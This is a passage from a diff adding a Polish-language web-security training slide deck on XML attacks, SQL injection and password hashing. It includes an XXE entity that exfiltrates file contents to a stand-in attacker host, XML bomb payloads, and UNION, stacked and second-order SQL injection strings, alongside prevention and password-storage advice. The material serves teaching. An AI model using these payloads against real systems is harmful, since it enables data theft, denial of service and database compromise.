+&lt;!<span style="color: #0000FF;">ENTITY</span> % all <span style="color: #036A07;">"</span><span style="color: #036A07;">&lt;!ENTITY send SYSTEM 'gopher://abcd.dns.attackers.com:443/xxe?%file;'&gt;</span><span style="color: #036A07;">"</span>&gt;
+%all;
+</pre>
+</div>
+
+<p>
+Dokładny opis: <a href="http://foxglovesecurity.com/2015/10/26/car-hacking-for-plebs-the-untold-story/">http://foxglovesecurity.com/2015/10/26/car-hacking-for-plebs-the-untold-story/</a>
+</p>
+</section>
+<section id="sec-7-4" >
+
+<h3>Billion Laughs</h3>
+<p>
+Atak DoS na parsery XML (znany też jako "XML Bomb" lub "Exponential
+Entity Expansion attack").
+</p>
+
+<pre class="example">
+&lt;?xml version="1.0"?&gt;
+&lt;!DOCTYPE lolz [
+ &lt;!ENTITY lol "lol"&gt;
+ &lt;!ELEMENT lolz (#PCDATA)&gt;
+ &lt;!ENTITY lol1 "&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;"&gt;
+ &lt;!ENTITY lol2 "&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;"&gt;
+ &lt;!ENTITY lol3 "&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;"&gt;
+ &lt;!ENTITY lol4 "&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;"&gt;
+ &lt;!ENTITY lol5 "&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;"&gt;
+ &lt;!ENTITY lol6 "&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;"&gt;
+ &lt;!ENTITY lol7 "&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;"&gt;
+ &lt;!ENTITY lol8 "&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;"&gt;
+ &lt;!ENTITY lol9 "&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;"&gt;
+]&gt;
+
+&lt;lolz&gt;&amp;lol9;&lt;/lolz&gt;
+</pre>
+</section>
+<section id="sec-7-5" >
+
+<h3>Quadratic Blowup</h3>
+<p>
+Atak podobny do Billion Laughs, z tym że zamiast wielokrotnie
+zagnieżdżonej struktury używamy powtórzenia dużych elementów. Pozwala
+to obejść ograniczenia ilości zagnieżdżeń.
+</p>
+
+<div class="org-src-container">
+
+<pre  class="src src-xml">&lt;?<span style="color: #0000FF;">xml</span> <span style="color: #BA36A5;">version</span>=<span style="color: #008000;">"</span><span style="color: #008000;">1.0</span><span style="color: #008000;">"</span>?&gt;
+&lt;!<span style="color: #0000FF;">DOCTYPE</span> kaboom [
+  &lt;!<span style="color: #0000FF;">ENTITY</span> a <span style="color: #036A07;">"</span><span style="color: #036A07;">aaaaaaaaaaaaaaaaaa..50kB..aaa</span><span style="color: #036A07;">"</span>&gt;
+]&gt;
+&lt;<span style="color: #000088; background-color: #DEDEDE;">kaboom</span>&gt;<span style="color: #D0372D;">&amp;</span><span style="color: #D0372D;">a</span><span style="color: #D0372D;">;&amp;</span><span style="color: #D0372D;">a</span><span style="color: #D0372D;">;&amp;</span><span style="color: #D0372D;">a</span><span style="color: #D0372D;">;&amp;</span><span style="color: #D0372D;">a</span><span style="color: #D0372D;">;&amp;</span><span style="color: #D0372D;">a</span><span style="color: #D0372D;">;&amp;</span><span style="color: #D0372D;">a</span><span style="color: #D0372D;">;&amp;</span><span style="color: #D0372D;">a</span><span style="color: #D0372D;">;&amp;</span><span style="color: #D0372D;">a</span><span style="color: #D0372D;">;&amp;</span><span style="color: #D0372D;">a</span><span style="color: #D0372D;">;</span>...50k...&lt;/<span style="color: #000088; background-color: #DEDEDE;">kaboom</span>&gt;
+</pre>
+</div>
+</section>
+<section id="sec-7-6" >
+
+<h3>Python - XML vulnerabilities</h3>
+<pre class="example">
+https://docs.python.org/2.7/library/xml.html#xml-vulnerabilities
+</pre>
+
+<table border="2" cellspacing="0" cellpadding="6" rules="groups" frame="hsides">
+
+
+<colgroup>
+<col  class="left" />
+
+<col  class="left" />
+
+<col  class="left" />
+
+<col  class="left" />
+
+<col  class="left" />
+
+<col  class="left" />
+</colgroup>
+<thead>
+<tr>
+<th scope="col" class="left">kind</th>
+<th scope="col" class="left">sax</th>
+<th scope="col" class="left">etree</th>
+<th scope="col" class="left">minidom</th>
+<th scope="col" class="left">pulldom</th>
+<th scope="col" class="left">xmlrpc</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td class="left">billion laughs</td>
+<td class="left">Yes</td>
+<td class="left">Yes</td>
+<td class="left">Yes</td>
+<td class="left">Yes</td>
+<td class="left">Yes</td>
+</tr>
+
+<tr>
+<td class="left">quadratic blowup</td>
+<td class="left">Yes</td>
+<td class="left">Yes</td>
+<td class="left">Yes</td>
+<td class="left">Yes</td>
+<td class="left">Yes</td>
+</tr>
+
+<tr>
+<td class="left">external entity expansion</td>
+<td class="left">Yes</td>
+<td class="left">No</td>
+<td class="left">No</td>
+<td class="left">Yes</td>
+<td class="left">No</td>
+</tr>
+
+<tr>
+<td class="left">DTD retrieval</td>
+<td class="left">Yes</td>
+<td class="left">No</td>
+<td class="left">No</td>
+<td class="left">Yes</td>
+<td class="left">No</td>
+</tr>
+
+<tr>
+<td class="left">decompression bomb</td>
+<td class="left">No</td>
+<td class="left">No</td>
+<td class="left">No</td>
+<td class="left">No</td>
+<td class="left">Yes</td>
+</tr>
+</tbody>
+</table>
+</section>
+<section id="sec-7-7" >
+
+<h3>Ataki XML - zapobieganie</h3>
+<p>
+Na ataki XMLem podatne są parsery dla praktycznie wszystkich języków
+(Java, .NET, Python, PHP, platformy mobilne itd.), jednakże wiele z
+nich można skonfigurować tak by nie rozwiązywała zewnętrznych
+elementów bądź zagnieżdżonych definicji w DTD.
+</p>
+
+<p>
+Można też całkowicie pozbyć się DTD zanim dokument XML zostanie
+przekazany do parsera.
+</p>
+</section>
+</section>
+<section>
+<section id="sec-8" >
+
+<h2>SQL Injection</h2>
+</section>
+<section id="sec-8-1" >
+
+<h3>Wprowadzenie</h3>
+<ul class="org-ul">
+<li>Atak SQL injection jest możliwy gdy dane wejściowe od użytkownika są
+użyte do budowy zapytań SQL, najczęściej poprzez konkatenację z
+łańcuchami budującymi docelowe zapytanie
+</li>
+<li>Jeden z groźniejszych ataków na aplikacje internetowe, pozwalający
+na:
+<ul class="org-ul">
+<li>wykradanie całych baz danych
+</li>
+<li>modyfikacje danych
+</li>
+<li>ataki DoS 
+</li>
+</ul>
+</li>
+<li>Praktycznie rzecz biorąc pojedyncza podatność na SQLi może
+doprowadzić do całkowitego przejęcia kontroli nad aplikacją
+</li>
+<li>Kiedyś bardzo "popularny" obecnie trochę stracił na znaczeniu, ale
+może czeka go wielki powrót?
+</li>
+</ul>
+
+</section>
+<section>
+
+<ul class="org-ul">
+<li>Złośliwy kod może zostać wstrzyknięty praktycznie każdym kanałem
+gdzie przekazywane są dane wejściowe do systemu:
+<ul class="org-ul">
+<li>parametry
+</li>
+<li>formularze
+</li>
+<li>ciasteczka
+</li>
+<li>nagłówki HTTP
+</li>
+<li>obiekty JSON/XML w request-cie
+</li>
+<li>parametry metod w webservice-ach
+</li>
+<li>dane z bazy danych
+</li>
+</ul>
+</li>
+</ul>
+
+</section>
+<section>
+
+<ul class="org-ul">
+<li>Na SQLi podatne są wszystkie typu zapytań SQL:
+<ul class="org-ul">
+<li>SELECT
+</li>
+<li>UPDATE
+</li>
+<li>INSERT
+</li>
+<li>ALTER, DROP itp
+</li>
+<li>niektóre procedury składowane
+</li>
+</ul>
+</li>
+</ul>
+</section>
+<section id="sec-8-2" >
+
+<h3>Zarys działania</h3>
+<p>
+Jeśli nasza aplikacja buduje zapytanie odpowiedzialne za logowanie
+użytkowników w ten sposób:
+</p>
+
+<div class="org-src-container">
+
+<pre  class="src src-java"><span style="color: #6434A3;">String</span> <span style="color: #BA36A5;">sql</span> = <span style="color: #008000;">"SELECT userId FROM users WHERE login='"</span> + 
+             login + <span style="color: #008000;">"' AND password='"</span> + pass + <span style="color: #008000;">"'"</span>;
+</pre>
+</div>
+
+<p>
+to wysyłając parametry:
+</p>
+
+<pre class="example">
+login=admin'--
+pass=cokolwiek
+</pre>
+
+<p>
+efektywnie wygenerujemy zapytanie:
+</p>
+
+<div class="org-src-container">
+
+<pre  class="src src-sql">SELECT userId FROM users WHERE login=<span style="color: #008000;">'admin'</span><span style="color: #8D8D84; font-style: italic;">-- AND password='cokolwiek'</span>
+</pre>
+</div>
+</section>
+<section id="sec-8-3" >
+
+<h3>Scenariusz</h3>
+<ol class="org-ol">
+<li>Szukanie podatności
+</li>
+<li>Poznanie struktury zapytania w którym jest użyta odkryta podatność
+</li>
+<li>Odkrycie rodzaju bazy danych
+</li>
+<li>Poznanie struktury bazy
+</li>
+<li>Wykonywanie własnych zapytań
+</li>
+</ol>
+</section>
+<section id="sec-8-4" >
+
+<h3>Scenariusz</h3>
+<img src="./images/generated-sql-scenario.png" alt="generated-sql-scenario.png" align="center" height="500px" />
+</section>
+<section id="sec-8-5" >
+
+<h3>Szukanie podatności - string</h3>
+<p>
+Badając parametr typu string:
+</p>
+<pre class="example">
+www.example.com/showNews.php?type=sport
+</pre>
+
+<p>
+Można spróbować:
+</p>
+<pre class="example">
+www.example.com/showNews.php?type=sport'
+</pre>
+
+<p>
+a potem
+</p>
+<pre class="example">
+www.example.com/showNews.php?type=sport''
+</pre>
+
+<p>
+Czasami taki test może skończyć się niepowodzeniem ze względu na błędy
+JS. Może to jednak oznaczać potencjalną podatność na XSS (JS
+injection). Obejściem problemu może być:
+</p>
+<pre class="example">
+www.example.com/showNews.php?type=sport%27%27
+</pre>
+</section>
+<section id="sec-8-6" >
+
+<h3>Szukanie podatności - liczba</h3>
+<p>
+Gdy parametr jest liczbą:
+</p>
+<pre class="example">
+www.example.com/showPage.php?id=5
+</pre>
+
+<p>
+Sprawdźmy:
+</p>
+<pre class="example">
+www.example.com/showPage.php?id=6-1
+</pre>
+
+<p>
+Można też tak:
+</p>
+<pre class="example">
+www.example.com/pages/6-1/show
+</pre>
+
+<p>
+Uwaga – to nie zadziała:
+</p>
+<pre class="example">
+www.example.com/showPage.php?id=4+1
+</pre>
+
+<p>
+Obejście:
+</p>
+<pre class="example">
+www.example.com/showPage.php?id=4%2B1
+</pre>
+</section>
+<section id="sec-8-7" >
+
+<h3>Znaki specjalne w URL a komentarze SQL</h3>
+<p>
+Znaki specjalne w url:
+</p>
+
+<ul class="org-ul">
+<li><code>+</code> - zamiana na spacje
+</li>
+<li><code>#</code> - anchor, nie wysyłane do serwera
+</li>
+<li><code>&amp;</code> - rozdziela parametry
+</li>
+<li><code>%23</code> - Zakodowany znak #
+</li>
+<li><code>%0A</code> - Zakodowana nowa linia 
+</li>
+</ul>
+
+<p>
+Komentarze w SQL:
+</p>
+<ul class="org-ul">
+<li><code>--</code>
+</li>
+<li><code>#</code>
+</li>
+<li><code>/*</code> 
+</li>
+</ul>
+</section>
+<section id="sec-8-8" >
+
+<h3>Poznanie struktury zapytania</h3>
+<p>
+Atakujący musi poznać strukturę części zapytania jakie jest wykonywane
+przed fragmentem podatnym na SQLi. Chodzi tutaj głównie o:
+</p>
+
+<ul class="org-ul">
+<li>liczbę kolumn
+</li>
+</ul>
+<pre class="example">
+www.example.com/showPage.php?id=5 order by 3 --
+www.example.com/showPage.php?id=5 order by 7 --
+www.example.com/showPage.php?id=5 order by 12 --
+</pre>
+
+<ul class="org-ul">
+<li>rodzaj kolumn i użycie danych z nich pochodzących
+</li>
+</ul>
+<pre class="example">
+www.example.com/showPage.php?id=-1 union select 1,2,3,4,5,6,7,8,9,10 --
+</pre>
+</section>
+<section id="sec-8-9" >
+
+<h3>Odkrycie rodzaju bazy danych</h3>
+<pre class="example">
+www.example.com/showPage.php?id=-1 union select 1,2,3,4,version(),6,7,8,9,10 --
+</pre>
+
+<p>
+W podobny sposób można poznać login użytkownika DB (<code>user</code>,
+<code>current_user</code>, <code>user()</code>), nazwę schematu (<code>current_database()</code>, <code>database()</code>)
+i serwera (<code>name</code>, <code>instance_name</code>).
+</p>
+</section>
+<section id="sec-8-10" >
+
+<h3>Pomocne linki</h3>
+<p>
+Funkcje i sposób odkrycia tych danych są zależne od bazy
+danych. Dostępne są porównania tego typu funkcji dla różnych baz:
+</p>
+
+<ul class="org-ul">
+<li><a href="http://pentestmonkey.net/category/cheat-sheet/sql-injection">http://pentestmonkey.net/category/cheat-sheet/sql-injection</a>
+</li>
+<li><a href="http://ferruh.mavituna.com/sql-injection-cheatsheet-oku/">http://ferruh.mavituna.com/sql-injection-cheatsheet-oku/</a>
+</li>
+<li><a href="http://www.sqlinjectionwiki.com/Categories/2/mysql-sql-injection-cheat-sheet/">http://www.sqlinjectionwiki.com/Categories/2/mysql-sql-injection-cheat-sheet/</a>
+</li>
+</ul>
+
+<p>
+W czasie pracy na zapytaniem może przydać się szybki dostęp do różnych
+silników baz danych <a href="http://sqlzoo.net">http://sqlzoo.net</a>
+</p>
+</section>
+<section id="sec-8-11" >
+
+<h3>Poznanie struktury bazy</h3>
+<p>
+Oracle:
+</p>
+
+<div class="org-src-container">
+
+<pre  class="src src-sql"><span style="color: #8D8D84; font-style: italic;">-- List tables</span>
+ SELECT owner, table_name 
+   FROM all_tables;
+
+<span style="color: #8D8D84; font-style: italic;">-- List columns</span>
+ SELECT column_name 
+   FROM all_tab_columns 
+  WHERE table_name = <span style="color: #008000;">'foo'</span>
+    AND owner = <span style="color: #008000;">'bar'</span>;
+</pre>
+</div>
+
+<p>
+MySQL:
+</p>
+
+<div class="org-src-container">
+
+<pre  class="src src-sql"><span style="color: #8D8D84; font-style: italic;">-- List tables</span>
+ SELECT table_schema, table_name
+   FROM information_schema.tables;
+
+<span style="color: #8D8D84; font-style: italic;">-- List columns</span>
+ SELECT table_name, column_name 
+   FROM information_schema.columns 
+  WHERE table_name = <span style="color: #008000;">'foo'</span>
+    AND table_schema = <span style="color: #008000;">'bar'</span>;
+</pre>
+</div>
+</section>
+<section id="sec-8-12" >
+
+<h3>Wykonywanie własnych zapytań</h3>
+<p>
+Wiedząc jaka jest struktura bazy danych atakujący może zacząć
+zasadniczy atak i rozpocząć pobieranie danych, gdzie z reguły
+najcenniejszą są dane o użytkownikach i ich hasłach.
+</p>
+
+<p>
+Jeśli hasła użytkowników zapisane są w czystym tekście albo tylko
+zahaszowane prostą funkcją (MD5) to w tym momencie atakujący ma już
+pełną kontrolę nad aplikacją.
+</p>
+</section>
+<section id="sec-8-13" >
+
+<h3>Odzyskiwanie haseł z hash-y</h3>
+<p>
+Mając hashe haseł potrzebujemy poznać hasła na podstawie których
+zostały utworzone:
+</p>
+
+<p>
+MD5, SHA1 z użyciem GPU: 
+</p>
+<ul class="org-ul">
+<li><a href="http://bvernoux.free.fr/md5/index.php">http://bvernoux.free.fr/md5/index.php</a>
+</li>
+<li><a href="http://www.elcomsoft.com/lhc.html">http://www.elcomsoft.com/lhc.html</a>
+</li>
+</ul>
+
+<p>
+Hasła systemowe, bazy danych
+</p>
+<ul class="org-ul">
+<li><a href="http://www.openwall.com/john/">http://www.openwall.com/john/</a>
+</li>
+<li><a href="https://hashkiller.co.uk/default.aspx">https://hashkiller.co.uk/default.aspx</a>
+</li>
+<li><a href="http://www.md5online.org/">http://www.md5online.org/</a>
+</li>
+</ul>
+</section>
+<section id="sec-8-14" >
+
+<h3>Hashkiller.co.uk - statystyki</h3>
+<table border="2" cellspacing="0" cellpadding="6" rules="groups" frame="hsides">
+
+
+<colgroup>
+<col  class="right" />
+
+<col  class="left" />
+
+<col  class="left" />
+</colgroup>
+<thead>
+<tr>
+<th scope="col" class="right">&#xa0;</th>
+<th scope="col" class="left">Algorithm</th>
+<th scope="col" class="left">Total cracked</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td class="right">1</td>
+<td class="left">MD5</td>
+<td class="left">27,220,696</td>
+</tr>
+
+<tr>
+<td class="right">2</td>
+<td class="left">SHA1</td>
+<td class="left">3,169,684</td>
+</tr>
+
+<tr>
+<td class="right">3</td>
+<td class="left">MySQL4.1/MySQL5</td>
+<td class="left">1,365,423</td>
+</tr>
+
+<tr>
+<td class="right">4</td>
+<td class="left">Double MD5</td>
+<td class="left">1,150,687</td>
+</tr>
+
+<tr>
+<td class="right">5</td>
+<td class="left">NTLM</td>
+<td class="left">1,127,773</td>
+</tr>
+
+<tr>
+<td class="right">6</td>
+<td class="left">md5(sha1($pass))</td>
+<td class="left">436,848</td>
+</tr>
+
+<tr>
+<td class="right">7</td>
+<td class="left">MD4</td>
+<td class="left">254,355</td>
+</tr>
+
+<tr>
+<td class="right">8</td>
+<td class="left">md5(md5(md5($pass)))</td>
+<td class="left">188,944</td>
+</tr>
+
+<tr>
+<td class="right">9</td>
+<td class="left">sha1(md5($pass))</td>
+<td class="left">120,828</td>
+</tr>
+
+<tr>
+<td class="right">10</td>
+<td class="left">sha1(sha1($pass))</td>
+<td class="left">14,725</td>
+</tr>
+
+<tr>
+<td class="right">11</td>
+<td class="left">sha1(sha1(sha1($pass)))</td>
+<td class="left">3,078</td>
+</tr>
+</tbody>
+</table>
+</section>
+<section id="sec-8-15" >
+
+<h3>Łamanie hashy za pomocą GPU</h3>
+<blockquote>
+<p>
+NVIDIA GeForce 8800 Ultra can calculate more than 200 million hashes
+per second
+</p>
+
+<p>
+&#x2013; <a href="https://en.wikipedia.org/wiki/MD5">https://en.wikipedia.org/wiki/MD5</a>
+</p>
+</blockquote>
+
+<p>
+Porównajmy dwa alfabety:
+</p>
+<ul class="org-ul">
+<li>A1 [a-z0-9] =&gt; 36 znaków
+</li>
+<li>A2 [a-zA-Z0-9] =&gt; 62 znaki
+</li>
+</ul>
+
+</section>
+<section>
+
+<table border="2" cellspacing="0" cellpadding="6" rules="groups" frame="hsides">
+
+
+<colgroup>
+<col  class="right" />
+
+<col  class="left" />
+
+<col  class="left" />
+
+<col  class="right" />
+
+<col  class="left" />
+
+<col  class="left" />
+</colgroup>
+<thead>
+<tr>
+<th scope="col" class="right">A1</th>
+<th scope="col" class="left">Ilość kombinacji</th>
+<th scope="col" class="left">Czas</th>
+<th scope="col" class="right">A2</th>
+<th scope="col" class="left">Ilość kombinacji</th>
+<th scope="col" class="left">Czas</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td class="right">36^1</td>
+<td class="left">36</td>
+<td class="left">~ 0s</td>
+<td class="right">62^1</td>
+<td class="left">62</td>
+<td class="left">~ 0s</td>
+</tr>
+
+<tr>
+<td class="right">36^2</td>
+<td class="left">1 269</td>
+<td class="left">~ 0s</td>
+<td class="right">62^2</td>
+<td class="left">3 844</td>
+<td class="left">~ 0s</td>
+</tr>
+
+<tr>
+<td class="right">36^3</td>
+<td class="left">46 656</td>
+<td class="left">~ 0s</td>
+<td class="right">62^3</td>
+<td class="left">238 328</td>
+<td class="left">~ 0s</td>
+</tr>
+
+<tr>
+<td class="right">36^4</td>
+<td class="left">1 679 616</td>
+<td class="left">~ 0s</td>
+<td class="right">62^4</td>
+<td class="left">14 776 336</td>
+<td class="left">~ 0s</td>
+</tr>
+
+<tr>
+<td class="right">36^5</td>
+<td class="left">60 466 176</td>
+<td class="left">0.3s</td>
+<td class="right">62^5</td>
+<td class="left">916 132 832</td>
+<td class="left">4.5s</td>
+</tr>
+
+<tr>
+<td class="right">36^6</td>
+<td class="left">2 176 782 336</td>
+<td class="left">11s</td>
+<td class="right">62^6</td>
+<td class="left">56 800 235 584</td>
+<td class="left">284s</td>
+</tr>
+
+<tr>
+<td class="right">36^7</td>
+<td class="left">78364164096</td>
+<td class="left">391s</td>
+<td class="right">62^7</td>
+<td class="left">3.5216146e+12</td>
+<td class="left">17608s (5h)</td>
+</tr>
+
+<tr>
+<td class="right">36^8</td>
+<td class="left">2.8211099e+12</td>
+<td class="left">14105s (4h)</td>
+<td class="right">62^8</td>
+<td class="left">2.1834011e+14</td>
+<td class="left">1091700s (303h)</td>
+</tr>
+</tbody>
+</table>
+
+
+</section>
+<section>
+
+<p>
+Wszystkie znaki ASCII z podstawowego zakresu =&gt; 95 znaków. Maksymalny czas
+łamania hasła 8 znakowego: 9214h (rok). 
+</p>
+</section>
+<section id="sec-8-16" >
+
+<h3>Jak nie przechowywać haseł</h3>
+<ul class="org-ul">
+<li>plain text
+</li>
+<li>md5, sha1
+</li>
+<li>sha256, sha512
+</li>
+<li>salted passwords
+</li>
+</ul>
+</section>
+<section id="sec-8-17" >
+
+<h3>Jak przechowywać hasła?</h3>
+<ul class="org-ul">
+<li>bcrypt 
+</li>
+<li>PBKDF2
+</li>
+</ul>
+</section>
+<section id="sec-8-18" >
+
+<h3>Łamanie bcrypt?</h3>
+<p>
+Cluster 25 Radeonów ma przepustowość na sekundę:
+</p>
+<ul class="org-ul">
+<li>NTLM - 348 miliardów
+</li>
+<li>MD5 - 180 miliardów
+</li>
+<li>SHA1 - 65 miliardy
+</li>
+<li>bcyprt - 71 tysięcy
+</li>
+</ul>
+</section>
+<section id="sec-8-19" >
+
+<h3>Modyfikowanie danych (stacked queries)</h3>
+<p>
+Duża część dokumentacji na temat SQLi pokazuje przykłady gdzie
+wstrzyknięty kod dopełnia główne zapytanie ale także dodaje kolejne
+zapytania, z reguły modyfikujące dane lub bazę:
+</p>
+
+<div class="org-src-container">
+
+<pre  class="src src-sql">SELECT * FROM users WHERE login = <span style="color: #008000;">'x'</span>; DROP TABLE users; SELECT <span style="color: #008000;">'1'</span>
+</pre>
+</div>
+
+<p>
+Obecnie większość bibliotek do obsługi baz danych nie pozwala by w
+ramach zapytania zostały wykonane dodatkowe zapytania a w
+szczególności o różnym typie. Stąd ten atak wydaje się być bardziej
+teoretyczny niż praktyczny
+</p>
+</section>
+<section id="sec-8-20" >
+
+<h3>Blind SQL Injection</h3>
+<p>
+Czasami mamy do czynienia z sytuacją, że wynik zapytania nie jest
+bezpośrednio wyświetlany w aplikacji ale zależy od niego logika
+przetwarzania strony. 
+</p>
+
+<p>
+Przykłady:
+</p>
+
+<ol class="org-ol">
+<li>Aplikacja wykonuje zapytanie <code>SELECT</code> nie czytając wartości kolumn,
+a jedynie sprawdzając czy zwraca ono jakieś wiersze lub nie. Na tej
+podstawie może np. wyświetlać na wynikowej stronie dedykowany
+komunikat („Masz nieprzeczytane wiadomości”)
+</li>
+<li>Aplikacja oczekuje, że zapytanie zwróci dokładnie jeden wiersz i go
+wyświetla, a nie mamy możliwości wpłynięcia na ten wiersz
+</li>
+<li>Podatność jest w podzapytaniu przy operatorze <code>EXISTS/NOT EXISTS</code>
+</li>
+<li>Aplikacja na podstawie zapytania wykonuje określoną akcję (np
+loguje), ale nie zwraca wyników bezpośrednio do widoku
+</li>
+</ol>
+</section>
+<section id="sec-8-21" >
+
+<h3>Blind SQL Injection</h3>
+<p>
+Możemy też spotkać przypadek, gdzie zapytanie do którego są przekazane
+parametry stanowią część większego zapytania:
+</p>
+
+<div class="org-src-container">
+
+<pre  class="src src-sql">SELECT * 
+  FROM table1
+ WHERE id IN ( SELECT id 
+                 FROM table2 
+                WHERE param=<span style="color: #008000;">'$param'</span>)
+</pre>
+</div>
+
+<p>
+W takiej sytuacji ominięcie problemu składni zapytania po
+wstrzyknięciu kodu nie zawsze może być proste czy wykonalne.
+</p>
+</section>
+<section id="sec-8-22" >
+
+<h3>Blind SQL Injection</h3>
+<p>
+Wstrzyknięty kod sprowadza się do odpowiedzi na pytanie (Tak/Nie)
+</p>
+
+<div class="org-src-container">
+
+<pre  class="src src-sql">SELECT * 
+  FROM orders
+ WHERE id = 5 
+   AND 1 = (CASE WHEN condition THEN 1 else 0 END) limit 1;
+</pre>
+</div>
+
+<div class="org-src-container">
+
+<pre  class="src src-sql">SELECT count(*) 
+  FROM orders
+ WHERE status = <span style="color: #008000;">'pending'</span>
+   AND substring(@@version, 1, 1)=5
+</pre>
+</div>
+</section>
+<section id="sec-8-23" >
+
+<h3>Second Order SQL Injection</h3>
+<p>
+O ataku <b>Second Order SQLi</b> mówimy gdy wartość przechowywana w bazie
+danych zostaje użyta do budowy innego zapytania.
+</p>
+
+<p>
+Atak następuje w kilku fazach:
+</p>
+<ul class="org-ul">
+<li>Atakujący dodaje wpis w miejscu które nie jest wrażliwe na SQLi
+(poprawnie obsługuje znaki kontrolne SQL)
+</li>
+<li>Aplikacja w innym miejscu używa tych danych do budowy kolejnego
+zapytania. Często nie filtruje danych pobieranych z bazy danych,
+traktując je jako bezpieczne
+</li>
+</ul>
+</section>
+<section id="sec-8-24" >
+
+<h3>Second Order SQL Injection - przykład</h3>
+<p>
+Atakujący tworzy konto użytkownika o nazwie: 
+</p>
+
+<div class="org-src-container">
+
+<pre  class="src src-sql">x<span style="color: #008000;">' or user_id=user_id --</span>
+</pre>
+</div>
+
+<p>
+Jeśli aplikacja buduje dowolne zapytanie z wykorzystaniem loginu:
+</p>
+
+<div class="org-src-container">
+
+<pre  class="src src-sql">SELECT * 
+  FROM orders 
+ WHERE user_id=<span style="color: #008000;">'$userLogin'</span>
+</pre>
+</div>
+
+<p>
+To atakujący zobaczy więcej niż powinien.
+</p>
+</section>
+<section id="sec-8-25" >
+
+<h3>Porównywanie łańcuchów - MySQL</h3>
+<p>
+Jaki będzie wynik?
+</p>
+
+<div class="org-src-container">
+
+<pre  class="src src-sql">SELECT <span style="color: #008000;">'a'</span>  = <span style="color: #008000;">'a'</span>      t1, 
+       <span style="color: #008000;">'a'</span>  = <span style="color: #008000;">'A'</span>      t2, 
+       <span style="color: #008000;">'a'</span>  = <span style="color: #008000;">'a '</span>     t3, 
+       <span style="color: #008000;">'a'</span>  = <span style="color: #008000;">'A '</span>     t4, 
+       <span style="color: #008000;">'a '</span> = <span style="color: #008000;">'a'</span>      t5,
+       <span style="color: #008000;">'a '</span> = <span style="color: #008000;">'a     '</span> t6,
+       <span style="color: #008000;">' a'</span> = <span style="color: #008000;">'a'</span>      t7,
+       <span style="color: #008000;">'a'</span>  = <span style="color: #008000;">' a'</span>     t8,
+       <span style="color: #008000;">'a'</span>  = <span style="color: #008000;">' a '</span>    t9;
+</pre>
+</div>
+</section>
+<section id="sec-8-26" >
+
+<h3>Porównywanie łańcuchów - MySQL - odpowiedź</h3>
+<div class="org-src-container">
+
+<pre  class="src src-sql">SELECT <span style="color: #008000;">'a'</span>  = <span style="color: #008000;">'a'</span>      t1, 
+       <span style="color: #008000;">'a'</span>  = <span style="color: #008000;">'A'</span>      t2, 
+       <span style="color: #008000;">'a'</span>  = <span style="color: #008000;">'a '</span>     t3, 
+       <span style="color: #008000;">'a'</span>  = <span style="color: #008000;">'A '</span>     t4, 
+       <span style="color: #008000;">'a '</span> = <span style="color: #008000;">'a'</span>      t5,
+       <span style="color: #008000;">'a '</span> = <span style="color: #008000;">'a     '</span> t6,
+       <span style="color: #008000;">' a'</span> = <span style="color: #008000;">'a'</span>      t7,
+       <span style="color: #008000;">'a'</span>  = <span style="color: #008000;">' a'</span>     t8,
+       <span style="color: #008000;">'a'</span>  = <span style="color: #008000;">' a '</span>    t9;
+</pre>
+</div>
+
+<pre class="example">
++----+----+----+----+----+----+----+----+----+
+| t1 | t2 | t3 | t4 | t5 | t6 | t7 | t8 | t9 |
++----+----+----+----+----+----+----+----+----+
+|  1 |  1 |  1 |  1 |  1 |  1 |  0 |  0 |  0 |
++----+----+----+----+----+----+----+----+----+
+</pre>
+</section>
+<section id="sec-8-27" >
+
+<h3>Porównywanie łańcuchów - PostgreSQL</h3>
+<p>
+Jaki będzie wynik?
+</p>
+
+<div class="org-src-container">
+
+<pre  class="src src-sql">SELECT <span style="color: #008000;">'a'</span>  = <span style="color: #008000;">'a'</span>      t1, 
+       <span style="color: #008000;">'a'</span>  = <span style="color: #008000;">'A'</span>      t2, 
+       <span style="color: #008000;">'a'</span>  = <span style="color: #008000;">'a '</span>     t3, 
+       <span style="color: #008000;">'a'</span>  = <span style="color: #008000;">'A '</span>     t4, 
+       <span style="color: #008000;">'a '</span> = <span style="color: #008000;">'a'</span>      t5,
+       <span style="color: #008000;">'a '</span> = <span style="color: #008000;">'a     '</span> t6,
+       <span style="color: #008000;">' a'</span> = <span style="color: #008000;">'a'</span>      t7,
+       <span style="color: #008000;">'a'</span>  = <span style="color: #008000;">' a'</span>     t8,
+       <span style="color: #008000;">'a'</span>  = <span style="color: #008000;">' a '</span>    t9;
+</pre>
+</div>
+</section>
+<section id="sec-8-28" >
+
+<h3>Porównywanie łańcuchów - PostgreSQL - odpowiedź</h3>
+<div class="org-src-container">
+
+<pre  class="src src-sql">SELECT <span style="color: #008000;">'a'</span>  = <span style="color: #008000;">'a'</span>      t1, 
+       <span style="color: #008000;">'a'</span>  = <span style="color: #008000;">'A'</span>      t2, 
+       <span style="color: #008000;">'a'</span>  = <span style="color: #008000;">'a '</span>     t3, 
+       <span style="color: #008000;">'a'</span>  = <span style="color: #008000;">'A '</span>     t4, 
+       <span style="color: #008000;">'a '</span> = <span style="color: #008000;">'a'</span>      t5,
